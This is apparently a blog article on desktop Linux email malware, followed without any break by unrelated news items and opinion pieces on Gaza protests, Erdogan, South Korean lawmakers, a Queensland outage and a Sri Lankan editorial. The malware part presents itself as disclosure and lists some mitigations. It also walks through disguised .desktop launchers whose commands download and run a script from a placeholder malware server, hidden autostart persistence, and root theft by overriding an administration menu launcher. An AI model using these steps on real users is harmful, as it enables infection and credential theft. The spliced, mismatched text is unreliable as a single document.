Even though there are some code snippets , the article will not provide the code for a ready - made piece of malware .
Several days ago I sent a message to the security teams at Ubuntu and Fedora , asking if they would like to take a look at this before I publish .
The Ubuntu team has n't responded yet , but the Fedora team told me that this is “ well - known and expected behavior ” and that they have no problem with me publishing this .
Well - known and expected ?
Really ?
But ok then , here we go .
Getting users to open attachments : Check out these nude shots !
If you are now looking forward to some new , fantangled exploit or some extra clever hackery , I will have to utterly disappoint you .
What I 'm showing here is merely an example of how the old - school social engineering " viruses " ( they hardly deserve that name ) which have been bothering the Windows world for such a long time can be made to run on Linux , or any other * nix OS with a modern desktop environment .
The premise of this type of ' virus ' is simple :
Get a user to run an executable attachment you sent them via email .
This is completely low - tech .
No black magic here .
I 'm not taking advantage of a new exploit in any way .
To make it work in Linux I 'm just using the ' features ' of modern desktop environments in somewhat unintended ways , I guess .
After all , it 's all “ well - known and expected ” .
Doing this under Windows is straight forward .
You create your malware as an EXE file , attach it to an email which says something like : " Whoa , check out these nude shots of ....! " .
The hapless user double - clicks on the attachment , which Windows – in the absence of some decent anti-virus software – will obediently execute .
Before you know it the malware is installed and the system is owned .
The execution of .EXE files from within email clients under Windows is of course also “ well - known and expected ” .
You think this is not possible under Linux ?
Of course it is .
It just requires one or two more steps .
However , there is nothing fundamental about the architecture of Linux that prevents user stupidity or ignorance , which is of course the main ingredient in any attack vector like this .
There is just one small stumbling block , which needs to be overcome .
Well , two , actually .
Firstly , most email clients for Linux will not execute attachments .
They might try to open them if they know the extension as an indication for a document or media type ( .pdf or other documents for example ) .
But that 's about it .
So , let 's say you have written your malware as a nice Python script .
In that case , your script may have the .py ending , but the email client is still unlikely to invoke the Python interpreter for you .
You would have to go out of your way to configure your system to do that , and who would do something like this ?
No , we need a slightly different approach .
Something that always gets executed when clicked on .
And here then is one more step that needs to be taken by the user , which might reduce the success rate of this attack vector a little .
The user has to first save the attachment and then double click on it .
Because while the email client typically cannot run an executable file , the desktop environment very well can as we will see .
So , the email will have to read something like :
Whoa , check out these nude shots of ...!
( if the attachment does n't want to open just save it to your desktop and open it ...)
That would sound suspicious to most of us , but ' most ' is not ' all ' and user stupidity is everywhere .
Besides , many users of web - based email clients are used to the save - first routine anyway .
Do not underestimate user ignorance – even on Linux
You might argue that most Linux users tend to be a bit more aware of what they are doing .
They usually had to make a conscious choice about their OS and therefore tend to not be your typical non-technical user .
But that is changing !
Some netbooks are shipped with Linux as default .
In that case users may not have consciously chosen Linux and thus can be just as blissfully ignorant as those Windows users who click on email attachments .
Also , some large organizations are thinking about mass Linux desktop roll - outs .
Various cities and governments around the world , for example .
The users there are not technical either and are just as likely to click on attachments .
Furthermore , the trouble free times of the past have given Linux users another false sense of security .
We are so used to the constant mantra of " Linux is so secure , you do n't even need anti-virus software ! " that we probably really do n't have any anti-virus software to catch us when we are about to do something dumb .
Ok , back to the technicalities .
Most email clients save attachments to the desktop of the user or in the user 's download directory where the user will then go look for it .
So , if the user does n't endlessly examine the attachment but simply clicks the ' save ' button in the email client then that usually does the trick :
The attachment will be right there in the face of the user .
In fact , I noticed that for some reason my Evolution email client sometimes has issues opening even normal documents as attachments directly .
For example , someone sends me an .odt file but Evolution sometimes does n't start OpenOffice for me .
So , whenever this does n't work , I just save and open it then .
I 'm already trained to do this kind of stuff !
I 'm probably not the only one .
Getting attachments to execute
We said earlier that attachments are not normally run when they are stored as files .
There is no standard file extension that indicates that a file should be executed when clicked , as there is under Windows .
Instead - and this is the second big hurdle we need to overcome - for the file to be executable under Linux ( or any other * nix OS ) , the execute flag would have to be set in the permissions of the file .
This is something that Windows does n't have , and which is often seen as one of the reasons why infecting a Windows PC can be so easy , and why it should be close to impossible on * nix systems .
When you save an email attachment under Linux , the execute flag is normally NOT set and thus , the file can't be executed just by clicking on it .
So , no luck ?
Not so fast .
Modern desktop environments , such as Gnome and KDE , conveniently offer a nice " workaround " called ' launchers ' .
Those are small files that describe how something should be started .
Just a few lines that specify the name , the icon that should be displayed and the actual command to execute .
Conveniently , the syntax of those launcher files is the same for Gnome and KDE .
And those launchers do n't have to have any execute permissions set on them !
Desktop environments treat those files as a special case , so when you click on them Gnome or KDE will happily execute the command that was specified within the launcher description and without the need for the execute bit to be set on the launcher itself .
Now we are getting somewhere !
A problem we are now facing is that the command that can be executed by a launcher is really just one line and just one command .
It 's a bit tough to install malware with just a single command .
Or is it ?
How about this here :
% bash -c " curl http://www.some_malware_server.org/s.py
-o /tmp/s.py ; python /tmp/s.py "
What does this single command do ?
It starts bash , a command shell ( part of any default install ) , and passes a string argument with two simple commands to it , which bash will then execute .
The first command ( curl ) downloads a script from some malware server you have to set up and then stores the script in a place where we know that we can write to ( the /tmp directory ) .
Note that on some systems ( Ubuntu , for example ) you do n't have curl , but a similar command called wget .
That complicates the actual command line here a little bit , but it's not an insurmountable problem , as shown in the step - by - step guide further down .
The second command ( the call to the Python interpreter ) then executes that freshly downloaded script ( a Python script in this example ) .
Both Python and curl ( or wget ) are typically part of the default install of most Linux distros .
If we put this into the Exec line of the launcher definition then a simple click on that launcher will lead to the execution of a single command , which in turn executes two commands , which then lead to the download and execution of an arbitrary complex script .
All without the execute bit being set anywhere .
You do n't need to be root to 0wn someone
None of that so far required root privileges .
And our script now can do whatever it wishes to do within the confines of the user account .
Confined it may be , but that does n't prevent the possibility of significant damage to be done .
For example , it can start to pilfer through the user 's address book to harvest email addresses , send them off to our malware server , start sending spam email or it can spread itself by email .
It can install a Firefox extension that captures passwords as the user types them .
It may start to share the user 's desktop via VNC without the user 's knowledge .
It can start a background daemon that pops up ads .
Linux adware !
All of this is executed as a normal user process .
Truly , on a desktop system that is normally just used by a single user owning that user account is pretty much equivalent to owning root , as far as doing damage is concerned :
All the action you are interested in takes place in the user account anyway .
But maybe you really want to have root for your malware ?
Well , there 's a way to do that as well , but this is not guaranteed to work in all cases and is frankly not necessary to successfully infect a machine .
So , to not distract from the important points of this article here , I have a discussion of that in an appendix .
Autostart after reboot
But surely , even if the user is not able to find the running process and kill it then just a simple reboot will stop that nonsense right ?
Surely , root privileges are needed in order to force our malware to be automatically launched in case of a system restart , right ?
Not so .
Users do not need root privileges in order to configure certain applications for autolaunch when they are logging into their own user sessions .
That is because they are only making changes to their own session and user account , not the underlying system settings .
Again , any apps started as part of the user session will only run at the user 's privilege level , but as we have seen , this is not a major problem .
Lots of interesting things can be done even then .
So , how do we get ourselves to be auto started when the user logs in ?
There are a number of scripts that get executed when you start a shell , but the user that 's likely to click on a suspicious attachment is not likely to start a shell very often if at all .
Fortunately , the modern desktop environments have their own set of commands which they are autostarting on login .
In the case of Gnome , take a look at what you find in ~/.config / autostart ( this directory may not exist yet , if you have not configured any apps for autostart ) .
That 's right !
More launchers !
Those are run every time the user logs into Gnome .
For KDE it 's even simpler :
Just link to your executable from within the ~/. kde / Autostart directory .
Our malware then only needs to create an appropriate entry in those directories and it will start to run whenever the user logs in !
And that 's all there is to it .
I leave the writing of the actual malware script as an exercise to the reader .
Compact step - by - step guide
Ok , so here is the summary then , which also fills in a few more specific details :
Write a piece of malware of your choice .
Maybe as a Python script ?
Good language , efficient code , pre-installed in most Linux distros and powerful standard library support ( for example , libraries for sending HTTP requests and handling SMTP are part of most standard installs ) .
Place that malware on some web - server .
Your malware needs the ability to install a launcher for itself so that it is started whenever the user logs in .
As mentioned , for Gnome that means creating a launcher description in the ~/.config / autostart folder .
For KDE just link to your executable from within the ~/. kde / Autostart directory .
To do that the malware code can either just force the issue and copy a launcher or link to itself into both locations ( creating any directories along the way if they do n't exist ) or it can be a bit smarter and choose the right thing to do based on the desktop environment that it detects .
For example , to create the shortcut for KDE , all you need to write in Python is :
import os
uname = os.getlogin ( )
drop_dir = “ /home/%s/.kde/Autostart ” % uname )
os.makedirs ( drop_dir )
os.symlink ("/home/%s/.local/.hidden/s.py " % uname , drop_dir + “ / s.py " )
For Gnome the Python script instead needs to write a launcher into the proper directory :
import os
relauncher_str = " " "
[ Desktop Entry ]
Type=Application
Name =Malware
Exec=python .local/.hidden/s.py
Icon=system-run
" " "
uname = os.getlogin ( )
drop_dir = “ /home/%s/.config/autostart ” % uname
os.makedirs ( drop_dir )
f = open ( drop_dir + ” /Malware.desktop ” , “ w ” )
f.write( relauncher_str )
f.close ( )
Writing these autostart entries is probably some of the first action that your malware should perform .
Now create a desktop launcher file for the installer of the malware , which is different than the launcher we use to restart the malware after a reboot .
The desktop launcher for the installer is what we send as attachment in the email to the targeted user .
It 's what the user clicks on after they saved it .
Try something like this :
[ Desktop Entry ]
Type=Application
Name=some_text.odt
Exec=bash -c ' URL=http://www.my_malware_server.com/s.py ;
DROP=~/.local/.hidden ;
mkdir -p $ DROP ;
if [ -e /usr / bin/wget ] ;
then wget $ URL - O $ DROP / s.py ;
else curl $ URL -o $ DROP / s.py ; fi ;
python $ DROP / s.py '
Icon=/usr / share/icons/hicolor/48x48/apps/ooo-writer.png
Note that we have specified a name that is harmless looking and even chose an icon that makes it look like a normal document ( that particular icon is present on both Ubuntu ( Gnome ) and Kubuntu ( KDE ) systems , but annoyingly not on Fedora ) .
If you claim to send nude shots in the email , just give it a name that makes it sound like an image ( something with .jpg at the end ) and chose one of the appropriate standard image icons .
The Exec line is a bit longer now , because we have to account for the possibility that either wget is installed or curl .
For example , Ubuntu systems usually have wget , while Fedora comes with curl .
So , we pass the appropriate commands to bash in order to check which one is present and then call the correct command to download the malware .
I 'm not a bash expert , so there might be a much more efficient way to do this .
But you get the idea .
Also , in that line we are creating a good location for the script ( $ DROP ) , which is not immediately obvious .
The mkdir command with the -p option will silently create whatever parent directories are necessary .
The target directory is in the user 's home , hidden away in some innocent looking local directory and can only be seen when also displaying hidden files .
The /tmp directory of course is not a good place for our malware , since it is wiped with each reboot .
Save this launcher file under the name you specified with the Name line , but add '. desktop ' to the end of the actual file name .
So , in our case , you would save the file as ' some_text.odt.desktop '.
When you place this on your desktop you will see that Gnome or KDE will treat it in a special way , not displaying the '.desktop ' extension .
So , the file just appears as ' some_text.odt ' .
Of course , that also means that the mail attachment will have this extension as well .
Some users may notice , many others will not .
Attach this file to an email , which prompts the recipient to save and open the attachment .
As explained , once it has been saved it will just appear as ' some_text.odt ' on the user 's desktop .
And with the icon we have chosen in the launcher description it will look quite harmless .
Send this email out to as many email addresses as you can get a hold of .
Voila !
A Linux virus in 5 simple steps .
Every user that saves and opens the attachment you have sent them will get themselves infected with the malware script of your choice , which is then also restarted whenever the user logs in again .
That was easy , was n't it ?
Solutions for the problem
The easiest solution to prevent this kind of problem is to not just blindly click on attachments that people have sent you .
Does that sound like a sentence you have always heard in the context of Windows before ?
You bet .
The point is : Even on Linux this advice should be taken serious .
A step that could be taken by the Gnome and KDE developers : Require launchers to have execute permissions .
A saved attachment wo n't have those .
Therefore , even though a syntactically correct and properly named launcher was dropped on the desktop a user can't just click on it and start it if the execute bit is not set .
Thirdly , stop perpetuating the myth that malware and viruses are only a problem for Windows .
Linux is – in principle – vulnerable as well , of course .
Even though users do n't operate with root privileges , if they inadvertently execute a bit of malware then a lot of damage and autostart installation can still be done .
The simple fact that an executed attachment wo n't run as root is NOT a useful protection against much of anything , as we have seen .
The fact that attachments are not saved with the execute bit is NOT a sufficient protection either , since modern desktop environments allow you to neatly maneuver around that .
Right now the limited market share of Linux on the desktop offers some protection .
The overall better security architecture offers some more protection .
But none of that is fool - proof .
And with larger Linux deployments in interesting locations – such as government organizations – those installations also become interesting targets for malware authors .
Thunar ?
Interestingly , the Thunar file manager under xfce ( Xubuntu 8.10 ) is doing something that Gnome 's and KDE 's file managers are not doing :
It will flag the desktop launcher file as potential malware and thus prevent execution via a simple click .
This works whether the attachment was saved from within Thunderbird or from within a web - based email system , such as Yahoo Mail .
Does anyone know what Thunar specifically does here to come up with the ' malware ' conclusion ?
However , I confirmed that it works with fresh , stock Ubuntu 8.10 , Kubuntu 8.10 and Fedora 10 installs .
Since this is mostly based on the functionality of Gnome and KDE , I assume that most distributions that utilize those desktops are vulnerable as well .
Bootnote
Some time ago there was a challenge issued to write a virus that would be able to infect a desktop Linux system .
The original challenge contained two important caveats , though : Firstly , it should be able to infect the machine of the person who wrote the challenge .
Nothing further is known about that machine .
For example , we do n't know which desktop he was running .
Secondly , the virus should be able to write a file into the /etc directory , to which normally only root has access .
I would content that a Linux virus can be called successful if it is able to infect standard installs of some of the most popular distros .
I know that the approach I am suggesting will be able to infect a standard install of Ubuntu , Kubuntu and Fedora , for example .
Secondly , as outlined above , getting root privileges is not necessary to successfully infect a Linux computer .
Well , it 's more the account of the user that is infected , is n't it ?
However , if we are talking about desktop computers then for the most part there is only going to be a single user .
The distinction between infecting the system ( as root ) or the user account ( as the user ) is entirely academic at best .
Such an infection is in effect the same as saying ' the machine is infected ' .
After all , the user is mostly logged in and the malware will run whenever that is the case .
Anyway , I contacted the author of this challenge and explained the situation to him .
He insists on the original rules laid out in his challenge , though .
Fair enough , it 's his challenge and therefore his rules .
So , what if you really want root then ?
Appendix : Getting root
Getting root privileges is always considered to be a bit of the holy - grail of compromising another machine .
As we have seen , not having it is n't really preventing you from having yourself a good time with a virus , though .
But just for completeness ' sake , let me outline a way for your malware to get root .
There might be other ways , but this is what I could come up with for now .
You see , even normal desktop Linux users will occasionally do stuff as root .
In the case of Ubuntu , for example , you will use ' sudo ' ( or the graphical equivalent gksu ) from time to time in order to perform system administration .
Maybe to administer users , change the date and time or to install new software .
Many items in the System ->
Administration menu will prompt you for your password for that reason .
By default , the user of a Ubuntu desktop system tends to be in the ' admin ' group , which in turn is mentioned in /etc / sudoers .
Thus , by providing your own password you can perform tasks with root privileges .
So , now how can we take advantage of this ?
It turns out that the menu items for your Gnome desktop are individually configured somewhere .
Maybe we can hack that so that instead of synaptic ( the graphical package manager ) or any other utility that runs under sudo or gksu ) our nice malware is started instead ?
After the user has provided their password for sudo ?
But as it turns out , the menu items are defined in a place to which only root has write access .
Take a look at /usr / share / applications .
In there you find – again – a large number of launcher files .
These are defining the various menu items .
For example , take a look at synaptic .
desktop .
You can see there the following line :
Exec=gksu /usr / sbin/synaptic
Yes , so if we could just go ahead and edit that , right ?
If our malware could go and change that to :
Exec=gksu python .local/.hidden/s.py
/usr/sbin/synaptic
That would execute our malware with root privileges .
Note that we quietly passed the original name of the executable ( /usr/ sbin/synaptic ) to our malware , so that it can start synaptic after it is done permanently giving itself root privileges or doing whatever it wants to do as root .
That way the user wo n't become suspicious .
But , alas , we can't edit that file .
Out of luck again ?
Fortunately , no .
Gnome is kind enough to see if we might have a local definition of one of those desktop files , which should override the system - wide settings .
Those go into ~/.local / share / applications .
So , you can simply copy the synaptic .
desktop file from /usr / share / applications to ~/.local / share / applications and perform the changes you want on it .
Then you just have to sit back and wait for the next time the user starts synaptic and you are in business .
Of course , you do n't have to limit yourself to synaptic .
To have a better chance of being executed with root privileges any of the apps in the Administration menu that require gksu are fair game .
And frankly , you can probably make similar changes and introduce gksu to many of the menu items in System -> Preferences .
As a Ubuntu user you are used to give your password to gksu from time to time .

Second consecutive day of Israeli Consulate blockades in Canada
Montreal , January 8th — Early Thursday , January 8th Montrealers blockaded the Israeli Consulate in Montreal in protest against the on - going Israeli assault on the people of Gaza .
The demonstrators were acting in solidarity with the 1.5 million people of Gaza , demanding Israel end its military assault and lift the 18 - month siege on the Gaza Strip to allow humanitarian aid into the territory .
Protesters are outraged at Israel ’s latest assault on the Palestinian people and by the Canadian government ’s refusal to condemn these massacres that have left 700 dead and over 3000 wounded since December 27 , 2008 .
In the past 24 hours Israeli has bombarded three U.N. schools in Gaza killing dozens of internally displaced refugees inside Gaza .
“ Canada ’s lack of response to recent war crimes in Gaza speaks volumes about their support for Israeli apartheid , ” said Sophie Schoen , a spokesperson for the action .
“ The Conservative government should expel all Israeli Consular officials from Canada , as other countries have done , ” said Amanda Dorter .
“ Until Ottawa ends its support for Israel we will continue to disrupt the workings of Israeli - Canadian cooperation . ”
“ We demand the Canadian government cut all ties with the apartheid regime of Israel , ” said Mostafa Henaway .
The action in Montreal comes on the heels of countless protests worldwide against Israeli war crimes , including an occupation of the Israeli Consulate in Toronto by Jewish women yesterday .

It is not exactly the first time that Erdogan speaks out against Israel in undiplomatic strong words .
Shortly after Israel first attacked Hamas in Gaza , the prime minister of secular Turkey said that God would punish it for its ‘ inhumane actions . ’
He added that Israel ’s offensive would eventually lead to its ( divine of course ) destruction .
Erdogan is a highly emotional individuals , a conservative Muslim and a political Islamist .
As such , one expects him to think negatively about Israel in private .
However , Israel and Turkey have been regional allies for decades .
The two have supported each other , traded with each other , and have had tremendous contacts with each other during good and bad times because this was in the interest of both .
The Islamist prime minister , however , cares less about pragmatism and more about his Islamist ideology .
He often hides this side of himself , but his Islamist essence has resurfaced in the last three weeks ; the masque of moderation ( not of secularism which he also tried to put on for a couple of years ) has been taken down , his real face is visible to all .
Erdogan does not act in Turkey ’s interest ; rather , he acts as one should expect from an Islamist who cares less about his nation ’s interest and more about forcing his religious and political ( because the two are mixed with him ) on everybody ; Turks and foreigners .
You see , if this was a case of moral values , of ‘ humanity , ’ and so on , Erdogan would have called on the UN to bar other countries years ago ; Syria , Iran , Saudi Arabia , China - all have governments with a far worse record than Israel .
These countries , except for China that is , all have one thing in common : they are majority - Muslim states .
Two of them are not just majority - Muslim but even states run by fundamentalists , in the case of Iran even extremists .
This explains why Erdogan does not criticize them at all .
Most are used to the double standard employed by Erdogan with regards to Israel , but commentators such as myself are not used to Turkish leaders using this double standard as well .
Turkey is a secular country and was ruled , for many decades , by secular nationalists who had little to no sympathy for Palestinians let alone Hamas .
At least , not in their public life .
Erdogan is a different political animal altogether , however ; by behaving as his nature forces him to , Erdogan is huring Turkey , its reputation , and its relationship with important , nay key , allies .
We will see how this develops in the coming months .
Will Erdogan lose power and will he be replaced by a secularist , or will he and his party remain in power , despite the wishes of secularists , for years to come , thereby finally doing what so many Turkish Islamists wanted to do for years : abolishing the country ’s secular system ?
As can be seen now , such a change will not only be bad for Turkish secularists , but it will also influence other countries .
These other countries should pay attention and , if necessary , make clear to Erdogan that they are willing to only accept this much , and nothing more .
If Turkey ’s secularists cannot keep Erdogan in check , perhaps foreigners can ; we can , at the very least , try to limit the damage he does to the region and the world .

Lee Jung - hee recalls the precise moment when all hell broke loose -- the tie - yanking , headlocks and neck - wringing , the thud of sledgehammers and , ominously , the sickening whine of a chain saw .
The 39 - year - old had witnessed plenty of violent protests in her native South Korea , where rowdy demonstrations are a Saturday newscast staple .
These combatants , however , were n’t blue - collar workers or student protesters , but dozens of blue - suited national lawmakers .
And they were in South Korea ’s august seat of government , the National Assembly .
Lee , a first - term opposition lawmaker , was center - stage in the pandemonium , storming a committee room where members of the ruling Grand National Party had barricaded themselves so they could vote without interference from the opposition .
But after a skirmish that seemed a 21st century version of castle defenders pouring boiling oil on the invading hordes , minority lawmakers finally broke through , only to find the room empty .
Their political rivals had fled moments earlier through a secret back door .
An incensed Lee smashed her colleagues ’ nameplates to the floor .
“ If I had caught the GNP lawmakers running away , I would have shouted , ‘ You bastards ! ’ ” the petite , bespectacled lawyer said later as she poured tea in her office .
“ My gesture was symbolic , to mark a moment when the values of democracy and the process of reason had given way to chaos . ”
Welcome to governmental policy debate South Korean - style .
Think “ Fight Club , ” not “ Mr. Smith Goes to Washington . ”
The pre-Christmas melee , much of it caught on camera and broadcast worldwide , has led South Korea into a bout of political soul - searching , prompting many to ask why lawmakers here feel the need to throw punches .
At what point in the political discourse , they wonder , does it seem like a rational move to brandish hammers , chisels and power tools ?
Bloggers have likened the legislative mayhem to an episode of “ Saturday Night Live , ” with one lampooning the battling factions as the Fire Extinguisher Party ( FEP ) and the Sledgehammer Party ( SP ) .
Polls show a growing public concern at the behavior .
In his weekly radio address after the brawl , a solemn South Korean President Lee Myung - bak said he “ blushed with shame ” over the incident .
“ It was as if the hammer that smashed down the conference room door also pounded the democracy of Korea , as well as my head and heart , ” he said .
Political scientists say the clash says as much about the growing pains of a young democracy as the feistiness of the South Korean character .
“ Korean democracy is only 20 years old , ” said Kyung Moon Hwang , an associate professor of Korean history at USC .
“ For decades , Koreans suffered under a military dictatorship .
It was a time marked by tremendous political struggle by intellectuals and students .
This behavior is a legacy of that era , that resistance of authority . ”
Others blame what they call a culture of confrontation .
“ Koreans are just not that good in engaging in discussion ; we ’re not good at the deliberative democratic process , ” said Chung - in Moon , a Yonsei University political science professor and onetime aide to former South Korean President Roh Moo-hyun .
“ One group says , ‘ My way is right , ’ and the other says , ‘ No . ’
The culture of accommodation just is n’t there .
So when it comes to politics , people tend to engage in the iron fist . ”
A recent survey shows that fights among South Korean politicians , listed as “ parliamentary disorder cases , ” rose from five in 2006 to 47 in 2008 .
Experts say American lawmakers likewise have seen their share of physical violence throughout history .
“ Congressmen have n’t always referred to each other as ‘ My gentleman colleague from Nebraska , ’ ” said David Kang , director of the Korean Studies Institute at USC .
“ Go back 150 years , and there were duels and horse whippings in the U.S. Congress .
Politics were a lot more bare - knuckled .
Legislators used to get beat up on their way to vote . ”
Brawling among South Korean politicians is also not new .
In 2007 , lawmakers battled over a move to impeach then - President Roh .
Politicians dived into the crowd like fans in a mosh pit .
One was carried out on a stretcher .
In neighboring Taiwan , legislators ’ public battles have included wrestling , shoe - throwing , tie - pulling and the hurling of microphones , lunch boxes and books .
A politician once tried to eat the draft of new legislation to stop a vote on the issue .
Although both nations feature developing arenas of free speech , South Koreans are fretting over the image their lawmakers present to the world .
“ Many believe that it reinforces the notion that South Korea may be part of the First World economically , but remains politically backward , ” Hwang said .
The political antipathy has paralyzed the National Assembly , where legislators were able to muster votes on fewer than 300 of the 2,600 bills introduced in the most recent session .
“ Many fighting politicians really do believe that if they lose their battle , democracy itself will be in danger , ” said Andy Jackson , a political columnist for the Korea Times .
Most South Korean lawmakers , he said , would rather fight than switch their votes : “ The attitude is that if you ’re not fighting , you ’re not trying .
So you pull off the gloves and you go at it . ”
The morning of the sledgehammer battle did n’t start well .
Ruling party officials had heard rumors that they might be barred from their planned committee vote on afree - trade agreement with the United States , so several spent the night near the assembly building in case opposition politicians tried to stop them from showing up to vote .
Hwang Jin-ha , a GNP legislator who oversaw the committee vote , said officials secured the conference room in anticipation of an attack .
“ We shut down the door to prevent violence , ” he said .
Clearly , that tactic failed .
In an effort to delay the vote , opposition legislators and their aides fought past security guards to hammer through the door , shattering windows , only to find their way blocked by a mountain of furniture .
That ’s when the defenders inside reached out through the shattered door to attack with fire extinguishers , unleashing a volley of powder in the faces of their assembly colleagues , bloodying one man .
“ As they punched the door with a hammer , we were upset inside .
Democracy was missing .
Talks with them will never take place , no matter how much they are whining and using violence , ” Hwang Jin-ha said .
“ What are we to do with reckless violence from small parties that act like gangs ? ”
Investigators are still looking into who fired up the chain saw .
So far no one has taken responsibility for using it to help break through the door .
The battle over the committee room caused $ 16,000 in damage , and lawsuits over assaults and property destruction have been filed by both sides .
But many opposition lawmakers say the moral victory was worth the cost .
“ We had to get inside that room , ” said Park Woong - du , an aide to Democratic Labor Party Chairman Kang Ki-kap , who faces criminal charges for his role in smashing the door and verbally abusing rival lawmakers .
“ Whatever happened , whether it was a fight or a debate , we had to get inside .
For us , democracy was on the line . ”
But the battle could have political consequences .
GNP lawmakers , who hold 172 of the 299 assembly seats , are seeking legislation to punish assembly violence with a mandatory three - year jail sentence , forcing offending politicians to give up their seats .
Opposition leaders call the proposal another outrageous attempt to bully minority politicians .
And in the wild world of South Korean politics , many fear the debate over anti-violence legislation could itself lead to fisticuffs .
For Lee , hard feelings remain .
This month , the mother of two found herself on the front lines of another political free - for - all when 200 armed security officers stormed a human blockade formed by minority party politicians in the rotunda of the assembly building .
Dozens were injured , including Lee , who was hospitalized after being dragged by guards .
She said she was trying to protect a political party poster that security personnel had ripped down .
Several lawmakers have since expressed remorse for battling with the guards and fellow politicians , but Lee remains defiant .
“ I have nothing to apologize for , ” she said .

Battling Drugs in Afghanistan Order to Kill Angers German Politicians
German polticians expressed dismay on Thursday over the fact that NATO high commander Bantz John Craddock wants to permit the targeted killing of drug traffickers even without proof that they are involved in terrorist developments .
NATO is trying to downplay the paper , saying it is merely a " guidance , " but that 's not correct .
Power has been restored to north Queensland after a massive outage blacked out all homes and businesses north of Townsville .
Powerlink Queensland chief operating officer Simon Bartlett said crews worked as quickly as possible to restore power to the Cairns and Townsville regions at about 7.40 pm ( AEST ) on Thursday .
He said the outage was caused by simultaneous faults on two of the high voltage transmission lines that supply electricity to north Queensland at about 5.30 pm ( AEST ) .
" We appreciate the community 's patience and understanding during the restoration efforts , " Mr Bartlett said in a statement .
" Crews will be working overnight to inspect the powerlines which were affected by the unexpected electrical fault and repair any damage to the network . "
A lightning strike could be to blame , but it was too early to determine the cause , he said .
" We 've had some really severe lightning storms , as everyone knows , throughout the state , and these lightning bolts can hit the transmission system , " he told the ABC .
Editorial And Then They Came For Me
No other profession calls on its practitioners to lay down their lives for their art save the armed forces and , in Sri Lanka , journalism .
In the course of the past few years , the independent media have increasingly come under attack .
Electronic and print - media institutions have been burnt , bombed , sealed and coerced .
Countless journalists have been harassed , threatened and killed .
It has been my honour to belong to all those categories and now especially the last .
I have been in the business of journalism a good long time .
Indeed , 2009 will be The Sunday Leader 's 15th year .
Many things have changed in Sri Lanka during that time , and it does not need me to tell you that the greater part of that change has been for the worse .
We find ourselves in the midst of a civil war ruthlessly prosecuted by protagonists whose bloodlust knows no bounds .
Terror , whether perpetrated by terrorists or the state , has become the order of the day .
Indeed , murder has become the primary tool whereby the state seeks to control the organs of liberty .
Today it is the journalists , tomorrow it will be the judges .
For neither group have the risks ever been higher or the stakes lower .
Why then do we do it ?
I often wonder that .
After all , I too am a husband , and the father of three wonderful children .
I too have responsibilities and obligations that transcend my profession , be it the law or journalism .
Is it worth the risk ?
Many people tell me it is not .
Friends tell me to revert to the bar , and goodness knows it offers a better and safer livelihood .
Others , including political leaders on both sides , have at various times sought to induce me to take to politics , going so far as to offer me ministries of my choice .
Diplomats , recognising the risk journalists face in Sri Lanka , have offered me safe passage and the right of residence in their countries .
Whatever else I may have been stuck for , I have not been stuck for choice .
But there is a calling that is yet above high office , fame , lucre and security .
It is the call of conscience .
The Sunday Leader has been a controversial newspaper because we say it like we see it : whether it be a spade , a thief or a murderer , we call it by that name .
We do not hide behind euphemism .
The investigative articles we print are supported by documentary evidence thanks to the public - spiritedness of citizens who at great risk to themselves pass on this material to us .
We have exposed scandal after scandal , and never once in these 15 years has anyone proved us wrong or successfully prosecuted us .
The free media serve as a mirror in which the public can see itself sans mascara and styling gel .
From us you learn the state of your nation , and especially its management by the people you elected to give your children a better future .
Sometimes the image you see in that mirror is not a pleasant one .
But while you may grumble in the privacy of your armchair , the journalists who hold the mirror up to you do so publicly and at great risk to themselves .
That is our calling , and we do not shirk it .
Every newspaper has its angle , and we do not hide the fact that we have ours .
Our commitment is to see Sri Lanka as a transparent , secular , liberal democracy .
Think about those words , for they each has profound meaning .
Transparent because government must be openly accountable to the people and never abuse their trust .
Secular because in a multi-ethnic and multi-cultural society such as ours , secularism offers the only common ground by which we might all be united .
Liberal because we recognise that all human beings are created different , and we need to accept others for what they are and not what we would like them to be .
And democratic ... well , if you need me to explain why that is important , you 'd best stop buying this paper .
The Sunday Leader has never sought safety by unquestioningly articulating the majority view .
Let 's face it , that is the way to sell newspapers .
On the contrary , as our opinion pieces over the years amply demonstrate , we often voice ideas that many people find distasteful .
For example , we have consistently espoused the view that while separatist terrorism must be eradicated , it is more important to address the root causes of terrorism , and urged government to view Sri Lanka 's ethnic strife in the context of history and not through the telescope of terrorism .
We have also agitated against state terrorism in the so - called war against terror , and made no secret of our horror that Sri Lanka is the only country in the world routinely to bomb its own citizens .
For these views we have been labelled traitors , and if this be treachery , we wear that label proudly .
Many people suspect that The Sunday Leader has a political agenda : it does not .
If we appear more critical of the government than of the opposition it is only because we believe that - pray excuse cricketing argot - there is no point in bowling to the fielding side .
Remember that for the few years of our existence in which the UNP was in office , we proved to be the biggest thorn in its flesh , exposing excess and corruption wherever it occurred .
Indeed , the steady stream of embarrassing expos‚s we published may well have served to precipitate the downfall of that government .
Neither should our distaste for the war be interpreted to mean that we support the Tigers .
The LTTE are among the most ruthless and bloodthirsty organisations ever to have infested the planet .
There is no gainsaying that it must be eradicated .
But to do so by violating the rights of Tamil citizens , bombing and shooting them mercilessly , is not only wrong but shames the Sinhalese , whose claim to be custodians of the dhamma is forever called into question by this savagery , much of which is unknown to the public because of censorship .
What is more , a military occupation of the country 's north and east will require the Tamil people of those regions to live eternally as second - class citizens , deprived of all self respect .
Do not imagine that you can placate them by showering " development " and " reconstruction " on them in the post - war era .
The wounds of war will scar them forever , and you will also have an even more bitter and hateful Diaspora to contend with .
A problem amenable to a political solution will thus become a festering wound that will yield strife for all eternity .
If I seem angry and frustrated , it is only because most of my countrymen - and all of the government - cannot see this writing so plainly on the wall .
It is well known that I was on two occasions brutally assaulted , while on another my house was sprayed with machine - gun fire .
Despite the government 's sanctimonious assurances , there was never a serious police inquiry into the perpetrators of these attacks , and the attackers were never apprehended .
In all these cases , I have reason to believe the attacks were inspired by the government .
When finally I am killed , it will be the government that kills me .
The irony in this is that , unknown to most of the public , Mahinda and I have been friends for more than a quarter century .
Indeed , I suspect that I am one of the few people remaining who routinely addresses him by his first name and uses the familiar Sinhala address oya when talking to him .
Although I do not attend the meetings he periodically holds for newspaper editors , hardly a month passes when we do not meet , privately or with a few close friends present , late at night at President 's House .
There we swap yarns , discuss politics and joke about the good old days .
A few remarks to him would therefore be in order here .
Mahinda , when you finally fought your way to the SLFP presidential nomination in 2005 , nowhere were you welcomed more warmly than in this column .
Indeed , we broke with a decade of tradition by referring to you throughout by your first name .
So well known were your commitments to human rights and liberal values that we ushered you in like a breath of fresh air .
Then , through an act of folly , you got yourself involved in the Helping Hambantota scandal .
